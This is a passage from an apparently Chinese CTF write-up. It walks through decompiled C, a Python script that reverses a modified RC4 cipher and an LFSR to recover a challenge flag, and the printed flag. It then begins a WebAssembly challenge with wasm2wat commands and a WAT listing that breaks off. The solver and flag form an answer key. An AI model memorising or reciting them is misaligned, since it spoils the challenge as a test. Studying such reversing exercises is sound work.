class="line">    *(_BYTE *)(a2 + i) = sub_10D0(*(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">4LL</span> * i));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i_1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用了10D0:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_10D0</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (a1 - <span class="number">19</span>) ^ <span class="number">0x5Au</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>笑死了，10D0直接逆向回去了，请忽略上述三个废话函数</p>
<p>需要看F10函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_F10</span><span class="params">(</span></span><br><span class="line"><span class="params">        __int64 a1,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> n8,</span></span><br><span class="line"><span class="params">        __int64 IntArrayElements,</span></span><br><span class="line"><span class="params">        <span class="type">signed</span> <span class="type">int</span> ArrayLength,</span></span><br><span class="line"><span class="params">        _DWORD *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-148h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+38h] [rbp-118h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+3Ch] [rbp-114h] BYREF</span></span><br><span class="line">  _BYTE v12[<span class="number">264</span>]; <span class="comment">// [rsp+40h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+148h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  sub_10F0(v12, <span class="number">256</span>);</span><br><span class="line">  sub_1190(v12, a1, n8);</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; ArrayLength; ++i )</span><br><span class="line">    ptr[i] = sub_1280(v12, *(<span class="type">unsigned</span> <span class="type">int</span> *)(IntArrayElements + <span class="number">4LL</span> * i), &amp;v11, &amp;v10);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>10F0:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_10F0</span><span class="params">(__int64 a1, <span class="type">int</span> n256)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+8h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 ^= i;</span><br><span class="line">    *(_BYTE *)(a1 + i) = i;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>1280:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1280</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2, <span class="type">int</span> *a3, <span class="type">int</span> *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+Fh] [rbp-25h]</span></span><br><span class="line"></span><br><span class="line">  *a3 = (*a3 + <span class="number">2</span>) % <span class="number">256</span>;</span><br><span class="line">  *a4 = (*(<span class="type">unsigned</span> __int8 *)(a1 + *a3) + *a4) % <span class="number">256</span>;</span><br><span class="line">  v5 = *(_BYTE *)(a1 + *a3);</span><br><span class="line">  *(_BYTE *)(a1 + *a3) = *(_BYTE *)(a1 + *a4);</span><br><span class="line">  *(_BYTE *)(a1 + *a4) = v5;</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> __int8 *)(a1 + (*(<span class="type">unsigned</span> __int8 *)(a1 + *a4) + *(<span class="type">unsigned</span> __int8 *)(a1 + *a3) + <span class="number">2</span>) % <span class="number">256</span>) ^ a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意1280魔改了，不是标准RC4。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_variant_decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="comment"># KSA: 密钥调度算法</span></span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># PRGA: 变体伪随机生成算法</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> val <span class="keyword">in</span> data:</span><br><span class="line">        i = (i + <span class="number">2</span>) % <span class="number">256</span>  <span class="comment"># 变体1: 步进为 2</span></span><br><span class="line">        j = (s[i] + j) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">        <span class="comment"># 变体2: 计算下标时多加了 2</span></span><br><span class="line">        idx = (s[i] + s[j] + <span class="number">2</span>) % <span class="number">256</span></span><br><span class="line">        k = s[idx]</span><br><span class="line">        res.append(val ^ k)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    </span><br><span class="line">    result2 = [<span class="number">206</span>, <span class="number">176</span>, <span class="number">51</span>, <span class="number">89</span>, <span class="number">115</span>, <span class="number">30</span>, <span class="number">199</span>, <span class="number">248</span>, <span class="number">5</span>, <span class="number">103</span>, <span class="number">255</span>, <span class="number">154</span>, <span class="number">27</span>, <span class="number">21</span>, <span class="number">228</span>, <span class="number">69</span>, <span class="number">190</span>, <span class="number">160</span>, <span class="number">235</span>, <span class="number">131</span>, <span class="number">5</span>, <span class="number">16</span>, <span class="number">112</span>, <span class="number">22</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 1. Native 层逆向</span></span><br><span class="line">    key = [<span class="number">104</span>, <span class="number">115</span>, <span class="number">119</span>, <span class="number">83</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">93</span>, <span class="number">101</span>]</span><br><span class="line">    arr = rc4_variant_decrypt(result2, key)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 还原为 3 个 64位 long (注意 Java 提取字节是小端序)</span></span><br><span class="line">    blocks = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        val = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            val |= (arr[i * <span class="number">8</span> + j] &lt;&lt; (j * <span class="number">8</span>))</span><br><span class="line">        blocks.append(val)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 逆转 Java 层 calculate (LFSR)</span></span><br><span class="line">    poly = <span class="number">8284901391658006163</span></span><br><span class="line">    mask_msb = <span class="number">1</span> &lt;&lt; <span class="number">63</span></span><br><span class="line">    mask_64 = <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    final_flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> blocks:</span><br><span class="line">        <span class="comment"># 逆转 64 次循环</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            <span class="comment"># 判断最低位：如果为1，说明正向最后一步发生了异或</span></span><br><span class="line">            <span class="keyword">if</span> t &amp; <span class="number">1</span>:</span><br><span class="line">                t = ((t ^ poly) &gt;&gt; <span class="number">1</span>) | mask_msb</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                t = (t &gt;&gt; <span class="number">1</span>)</span><br><span class="line">            t &amp;= mask_64</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 4. 转换回字符串</span></span><br><span class="line">        <span class="comment"># Java 的 parseLong(hex, 16) 意味着第一个字符在高位 (Big Endian)</span></span><br><span class="line">        block_hex = <span class="built_in">format</span>(t, <span class="string">&#x27;016x&#x27;</span>)</span><br><span class="line">        final_flag += <span class="built_in">bytes</span>.fromhex(block_hex).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> final_flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, solve())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;解码失败，请检查数据。错误信息:&quot;</span>, e)</span><br></pre></td></tr></table></figure>
<p><strong>flag{345623095654755648}</strong></p>
<ul>
<li>Wm</li>
</ul>
<blockquote>
<p>Have you heard of wasm</p>
</blockquote>
<p>高端局，第一次见wasm文件</p>
<p>wasm即WebAssembly，是一种二进制指令格式，设计用于在浏览器中高性能执行，但也常用于 CTF 的逆向题中。<br><code>.wasm</code> 文件是编译后的二进制模块，通常由 C/C++/Rust 等语言编译而来。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install wabt</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wasm2wat challenge.wasm -o challenge.wat</span><br></pre></td></tr></table></figure>
<p>wasm2wat：将 wasm 二进制文件转为文本格式的 .wat（WebAssembly 文本格式，类似汇编）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br></pre></td><td class="code"><pre><span class="line">(module</span><br><span class="line">  (type (;0;) (func (param i32)))</span><br><span class="line">  (type (;1;) (func))</span><br><span class="line">  (type (;2;) (func (param i32 i32) (result i32)))</span><br><span class="line">  (type (;3;) (func (param i32 i32 i32) (result i32)))</span><br><span class="line">  (type (;4;) (func (param i32 i32)))</span><br><span class="line">  (type (;5;) (func (param i32) (result i32)))</span><br><span class="line">  (type (;6;) (func (result i32)))</span><br><span class="line">  (func (;0;) (type 1)</span><br><span class="line">    nop)</span><br><span class="line">  (func (;1;) (type 2) (param i32 i32) (result i32)</span><br><span class="line">    (local i32 i32 i32 i32 i32 i32 i32 i32 i32 i32)</span><br><span class="line">    global.get 0</span><br><span class="line">    i32.const 144</span><br><span class="line">    i32.sub</span><br><span class="line">    local.tee 7</span><br><span class="line">    global.set 0</span><br><span class="line">    block  ;; label = @1</span><br><span class="line">      local.get 1</span><br><span class="line">      i32.const 48</span><br><span class="line">      i32.gt_u</span><br><span class="line">      br_if 0 (;@1;)</span><br><span class="line">      local.get 7</span><br><span class="line">      i32.const 128</span><br><span class="line">      i32.add</span><br><span class="line">      local.set 8</span><br><span class="line">      loop  ;; label = @2</span><br><span class="line">        local.get 3</span><br><span class="line">        i32.const 8</span><br><span class="line">        i32.ne</span><br><span class="line">        if  ;; label = @3</span><br><span class="line">          local.get 3</span><br><span class="line">          local.get 8</span><br><span class="line">          i32.add</span><br><span class="line">          local.get 3</span><br><span class="line">          i32.const 1024</span><br><span class="line">          i32.add</span><br><span class="line">          i32.load8_u</span><br><span class="line">          local.get 3</span><br><span class="line">          i32.const 1040</span><br><span class="line">          i32.add</span><br><span class="line">          i32.load8_u</span><br><span class="line">          local.get 3</span><br><span class="line">          i32.const 255</span><br><span class="line">          i32.and</span><br><span class="line">          call 2</span><br><span class="line">          i32.store8</span><br><span class="line">          local.get 3</span><br><span class="line">          i32.const 1</span><br><span class="line">          i32.add</span><br><span class="line">          local.set 3</span><br><span class="line">          br 1 (;@2;)</span><br><span class="line">        end</span><br><span class="line">      end</span><br><span class="line">      i32.const 8</span><br><span class="line">      local.set 3</span><br><span class="line">      loop  ;; label = @2</span><br><span class="line">        local.get 3</span><br><span class="line">        i32.const 16</span><br><span class="line">        i32.ne</span><br><span class="line">        if  ;; label = @3</span><br><span class="line">          local.get 3</span><br><span class="line">          local.get 8</span><br><span class="line">          i32.add</span><br><span class="line">          local.get 3</span><br><span class="line">          i32.const 1024</span><br><span class="line">          i32.add</span><br><span class="line">          i32.load8_u</span><br><span class="line">          local.get 3</span><br><span class="line">          i32.const 1040</span><br><span class="line">          i32.add</span><br><span class="line">          i32.load8_u</span><br><span class="line">          local.get 3</span><br><span class="line">          i32.const 255</span><br><span class="line">          i32.and</span><br><span class="line">          call 2</span><br><span class="line">          